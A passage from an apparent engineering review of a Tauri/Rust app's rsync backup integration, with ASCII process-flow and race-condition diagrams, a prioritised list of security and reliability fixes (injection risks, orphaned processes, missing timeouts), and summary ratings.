for line in reader.lines() {
    log_buffer.push(line?);

    if log_buffer.len() >= 10 || last_flush.elapsed() > Duration::from_millis(100) {
        let _ = app.emit("rsync-log-batch", log_buffer.clone());
        log_buffer.clear();
        last_flush = Instant::now();
    }
}
```

---

## Process Flow Diagram (ASCII)

```
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                              RSYNC INTEGRATION LIFECYCLE                                    │
└─────────────────────────────────────────────────────────────────────────────────────────────┘

FRONTEND                    BACKEND (Tauri Command)                RSYNC SERVICE
   │                               │                                      │
   ├─────[invoke run_rsync]────────►                                      │
   │                               │                                      │
   │                               ├────[spawn_rsync(job)]───────────────►
   │                               │                                      │
   │                               │                 ┌──────────────────────────────────┐
   │                               │                 │ 1. Check is_job_running()        │
   │                               │                 │    └─► Err: JobAlreadyRunning   │
   │                               │                 ├──────────────────────────────────┤
   │                               │                 │ 2. Build rsync args:             │
   │                               │                 │    • Base flags (-D, --links...) │
   │                               │                 │    • SSH config (-e ssh -p...)   │
   │                               │                 │    • Exclude patterns            │
   │                               │                 │    • Link-dest for Time Machine  │
   │                               │                 ├──────────────────────────────────┤
   │                               │                 │ 3. Determine destination:        │
   │                               │                 │    • TimeMachine: YYYY-MM-DD...  │
   │                               │                 │    • Other: "current"            │
   │                               │                 ├──────────────────────────────────┤
   │                               │                 │ 4. Command::new("rsync")         │
   │                               │                 │      .args(args)                 │
   │                               │                 │      .stdout(Stdio::piped())     │
   │                               │                 │      .stderr(Stdio::piped())     │
   │                               │                 │      .spawn()?                   │
   │                               │                 ├──────────────────────────────────┤
   │                               │                 │ 5. Track state:                  │
   │                               │                 │    active_jobs[job_id] = pid     │
   │                               │                 │    backup_info[job_id] = info    │
   │                               │                 └──────────────────────────────────┘
   │                               │                                      │
   │                               ◄────[Ok(child)]──────────────────────┤
   │                               │                                      │
   │                ┌──────────────┼──────────────┐                       │
   │                │              │              │                       │
   │         [spawn thread 1]     │       [spawn thread 2]                │
   │         stdout reader        │       stderr reader                   │
   │                │              │              │                       │
   │                │              │              │                       │
   │    ┌───────────▼──────────┐  │  ┌───────────▼──────────┐            │
   │    │ BufReader(stdout)    │  │  │ BufReader(stderr)    │            │
   │    │   .lines()           │  │  │   .lines()           │            │
   │    │      │               │  │  │      │               │            │
   │    │      ├─► Parse line  │  │  │      └─► Format msg  │            │
   │    │      │   progress?   │  │  │          [stderr]    │            │
   │    │      ├─► Yes: emit   │  │  │                      │            │
   │    │      │   'progress'  │  │  │          emit 'log'  │            │
   │    │      │               │  │  │                      │            │
   │    │      └─► No: emit    │  │  │                      │            │
   │    │          'log'       │  │  │                      │            │
   │    └──────────────────────┘  │  └──────────────────────┘            │
   │                              │                                      │
   ◄──[rsync-progress]────────────┤                                      │
   │  {                           │                                      │
   │    transferred: "1.2GB"      │                                      │
   │    percentage: 45            │                                      │
   │    speed: "5MB/s"            │                                      │
   │  }                           │                                      │
   │                              │                                      │
   ◄──[rsync-log]─────────────────┤                                      │
   │  { message: "file.txt" }     │                                      │
   │                              │                                      │
   │                              │                                      │
   │                       [child.wait()]─────────────────►              │
   │                              │                      (blocks)        │
   │                              │                         │            │
   │                              │                         │            │
   │                              │                ┌────────▼────────┐   │
   │                              │                │ rsync exits     │   │
   │                              │                │ with status     │   │
   │                              │                └────────┬────────┘   │
   │                              │                         │            │
   │                              │                         │            │
   │                              ◄────[ExitStatus]─────────┘            │
   │                              │                                      │
   │                              ├──[Wait for reader threads]───────►   │
   │                              │     stdout_handle.join()             │
   │                              │     stderr_handle.join()             │
   │                              │                                      │
   │                              │                                      │
   │                   ┌──────────┴──────────┐                           │
   │                   │  Success?           │                           │
   │                   └──────────┬──────────┘                           │
   │                              │                                      │
   │         ┌────────────────────┼────────────────────┐                 │
   │         │ YES                │ NO                 │                 │
   │         │                    │                    │                 │
   │    ┌────▼────────┐      ┌────▼────────┐          │                 │
   │    │ Write       │      │ Cleanup     │          │                 │
   │    │ manifest    │      │ partial     │          │                 │
   │    │             │      │ backup      │          │                 │
   │    │ Update      │      │             │          │                 │
   │    │ latest      │      │ Emit error  │          │                 │
   │    │ symlink     │      │             │          │                 │
   │    │             │      └─────────────┘          │                 │
   │    │ Index       │                               │                 │
   │    │ snapshot    │                               │                 │
   │    │             │                               │                 │
   │    └────┬────────┘                               │                 │
   │         │                                        │                 │
   │         ├────[mark_completed(job_id)]───────────┴─────────────────►
   │         │                                                           │
   │         │                              ┌──────────────────────┐    │
   │         │                              │ active_jobs.remove() │    │
   │         │                              │ backup_info.remove() │    │
   │         │                              └──────────────────────┘    │
   │         │                                                           │
   │         │                                                           │
   ◄────[rsync-complete]──────────┤                                      │
   │  {                           │                                      │
   │    success: true/false       │                                      │
   │    error: "..." or null      │                                      │
   │  }                           │                                      │
   │                              │                                      │
   │                              │                                      │
   │────[UI: Show result]         │                                      │


╔═══════════════════════════════════════════════════════════════════════════╗
║                          CANCELLATION FLOW                                ║
╚═══════════════════════════════════════════════════════════════════════════╝

FRONTEND                    BACKEND                         RSYNC SERVICE
   │                           │                                  │
   ├──[invoke kill_rsync]─────►                                  │
   │                           │                                  │
   │                           ├────[kill_job(job_id)]───────────►
   │                           │                                  │
   │                           │              ┌────────────────────────────┐
   │                           │              │ 1. active_jobs.remove()    │
   │                           │              ├────────────────────────────┤
   │                           │              │ 2. Unix:                   │
   │                           │              │    kill -9 -PID            │
   │                           │              │    (process group)         │
   │                           │              │                            │
   │                           │              │    kill -9 PID             │
   │                           │              │    (specific)              │
   │                           │              │                            │
   │                           │              │    pkill -9 -P PID         │
   │                           │              │    (orphans)               │
   │                           │              ├────────────────────────────┤
   │                           │              │ 3. Windows:                │
   │                           │              │    taskkill /PID x /T /F   │
   │                           │              └────────────────────────────┘
   │                           │                                  │
   │                           ◄────[Ok(())]──────────────────────┤
   │                           │                                  │
   │◄────[Ok]──────────────────┤                                  │
   │                           │                                  │
   │                           │  ⚠️  No verification that         │
   │                           │      process actually died!      │


╔═══════════════════════════════════════════════════════════════════════════╗
║                       CRITICAL RACE CONDITION                             ║
╚═══════════════════════════════════════════════════════════════════════════╝

Thread A                                Thread B
   │                                       │
   ├─[spawn_rsync(job_1)]                 │
   │                                       ├─[spawn_rsync(job_1)]  ← Same job!
   │                                       │
   ├─ is_job_running("job_1")?            │
   │  └─► false (not in HashMap)          ├─ is_job_running("job_1")?
   │                                       │  └─► false (A hasn't inserted yet)
   │                                       │
   ├─ spawn rsync PID 1234                │
   │                                       ├─ spawn rsync PID 5678
   │                                       │
   ├─ active_jobs["job_1"] = 1234         │
   │                                       ├─ active_jobs["job_1"] = 5678  ⚠️ Overwrites!
   │                                       │
   └─ Return PID 1234                     └─ Return PID 5678

Result: Two rsync processes running, only 5678 tracked, 1234 orphaned!
```

---

## Recommended Fixes Priority

### 🔴 **CRITICAL (Fix Immediately)**

1. **Command Injection in Custom Commands**
   - Remove feature OR implement strict sandboxing
   - Validate all user inputs

2. **Race Condition in spawn_rsync**
   - Atomic check-and-insert
   - Use file-based locking for multi-instance safety

3. **No Cleanup on Failure**
   - Implement RAII guards for guaranteed cleanup
   - Remove partial snapshots on failure

4. **No Process Wait Timeout**
   - Implement configurable timeout
   - Handle hung rsync processes

5. **SSH Parameter Injection**
   - Validate all SSH parameters
   - Use argument arrays, not string concatenation

### 🟡 **HIGH (Fix Soon)**

6. **Kill Doesn't Verify Termination**
   - Two-phase shutdown (SIGTERM then SIGKILL)
   - Verify process exit before returning

7. **Orphaned Process Recovery**
   - Scan for orphans on app startup
   - Attempt reattachment or cleanup

8. **No Retry Logic**
   - Implement exponential backoff for transient failures
   - Distinguish retryable vs permanent errors

9. **Lock Poisoning Unhandled**
   - Properly handle mutex poisoning
   - Return errors instead of silent failures

### 🟢 **MEDIUM (Improvement)**

10. **Progress Calculation Inaccurate**
    - Calculate from total bytes, not per-file percentage
    - Show file count progress

11. **Regex Recompilation**
    - Use `once_cell::Lazy` for static regex
    - Benchmark performance improvement

12. **Output Parsing Fragile**
    - Parse more rsync output formats
    - Structured error detection

13. **No Disk Space Check**
    - Pre-flight space verification
    - Early failure before starting transfer

### 🔵 **LOW (Nice to Have)**

14. **Event Batching**
    - Reduce IPC overhead
    - Batch log messages

15. **Better Error Messages**
    - Map rsync exit codes to user-friendly messages
    - Provide actionable troubleshooting steps

---

## Summary

The rsync integration is **functionally complete** but has **critical security and reliability gaps**:

**Security**: 7/10 - Command injection risks in custom commands and SSH parameters
**Reliability**: 6/10 - Race conditions, orphaned processes, no cleanup on failure
**Performance**: 8/10 - Good design but could optimize event emission and parsing
**Error Handling**: 5/10 - Many failure modes unhandled or silently ignored
**Maintainability**: 9/10 - Well-structured, good separation of concerns, extensive tests

**Overall Robustness: 7.5/10**

The code demonstrates solid understanding of Rust async patterns and Tauri architecture, but production deployment requires addressing the critical security vulnerabilities and implementing proper error recovery mechanisms.
